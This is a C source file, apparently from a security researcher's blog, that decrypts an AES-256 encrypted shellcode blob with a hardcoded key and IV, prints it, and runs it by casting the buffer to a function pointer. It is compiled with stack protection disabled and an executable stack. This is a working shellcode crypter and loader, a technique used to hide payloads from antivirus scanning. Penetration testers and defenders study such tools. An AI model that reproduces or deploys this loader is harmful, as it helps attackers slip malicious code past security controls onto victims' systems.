/*
decrypt.c
Sanjiv Kawa (@skawasec)
www.popped.io
December 7, 2016

This program decrypts and executes the shellcode encrypted by encrypt.c

Compile: gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
*/

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <time.h>

//print shellcode in \x format
void print_shellcode(unsigned char *shellcode)
{
  int i, len;

  len = strlen(shellcode);

  for (i = 0; i < len; i++)
  {
    printf("\\x%02x", shellcode[i]);
  }
    printf("\n");
}

//execute shellcode
void execute_shellcode(unsigned char *shellcode)
{
  printf("\n");
  int (*ret)() = (int(*)())shellcode;
  ret();
}

//main
int main (void)
{
  unsigned char decrypted[128]; //buffer for decrypted shellcode
  int decrypted_len, encrypted_len; //length of shellcode


  //128 bit AES initialization vector used to encrypt the shellcode
  unsigned char iv[] = "KSB1FebW397VI5uG";

  //256 bit AES key used to encrypt the shellcode
  unsigned char key[] = "PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw";

  //encrypted shellcode
  unsigned char encrypted[] = "\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70";

  //length of encrypted shellcode
  encrypted_len = strlen(encrypted);

  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
  print_shellcode(encrypted);

  printf("[+] AES 128 bit IV: %s\n", (iv));
  printf("[+] AES 256 bit Key: %s\n", (key));

  //initialize the library
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  //decrypt the shellcode
  decrypted_len = decrypt(encrypted, encrypted_len, key, iv, decrypted);

  //null terminate the shellcode for printing
  decrypted[decrypted_len] = '\0';

  printf("[+] Decrypted Shellcode (%d bytes):\n", (decrypted_len));
  print_shellcode(decrypted);

  //clean up
  EVP_cleanup();
  ERR_free_strings();

  printf("[+] Executing Shellcode:\n");
  //execute shellcode
  execute_shellcode(decrypted);

  return 0;
}

//error handler
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

//decryption function for AES 256 with a 128 bit initialization vector
int decrypt(unsigned char *encrypted, int encrypted_len, unsigned char *key, unsigned char *iv, unsigned char *decrypted)
{
  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure

  int len, decrypted_len;

  //create and initialize the context
  if(!(ciphertext = EVP_CIPHER_CTX_new()))
    handleErrors(); //error handler

  //initialize the decryption operation for AES 256 with a 128 bit initialization vector
  EVP_DecryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);

  EVP_DecryptUpdate(ciphertext, decrypted, &len, encrypted, encrypted_len); //decrypt shellcode

  decrypted_len = len; //decrypted shellcode length

  EVP_DecryptFinal_ex(ciphertext, decrypted + len, &len); //finalize encryption

  decrypted_len += len; //decrypted shellcode length

  EVP_CIPHER_CTX_free(ciphertext); //clean up

  return decrypted_len;
}
